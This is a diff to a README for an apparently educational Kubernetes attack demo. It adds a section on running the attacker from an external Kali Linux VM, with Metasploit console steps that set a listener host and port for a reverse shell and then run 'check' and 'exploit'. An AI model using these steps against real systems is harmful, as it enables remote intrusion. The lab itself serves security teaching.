@@ -5,6 +5,7 @@
 * [Installation](#installation)
 * [Demo](#demo)
 * [Cleanup](#cleanup)
+* [Attacker from external VM](#attacker-from-external-vm)
 * [Tips](#tips)
 
 <!-- vim-markdown-toc -->
@@ -80,6 +81,26 @@ ls -la
 ```bash
 helm uninstall sushi-restaurant -n sushi
 helm uninstall attacker-client -n attacker
+```
+# Attacker from external VM
+In order to setup the attacker machine from an external VM running a
+distribution like Kali Linux, you will need to assign a public IP address to
+this machine so that it is reachable. Additionally, the port where the the
+reverse shell connection will be established needs to be allowed for input
+connections (i.e: In AWS the security group of the EC2 instance needs to allow
+input connections to port <X>)
+
+How to run the exploit is very similar. First ssh into the Kali Linux machine:
+```bash
+# Start metasploit console
+msfconsole
+# Follow the same steps that we already described
+# We will need to set a few extra options
+set lhost <public-ip-of-vm>
+set lport <port-that-we-allow-input-connections>
+# set lport 4444
+check
+exploit
 ```
 
 # Tips
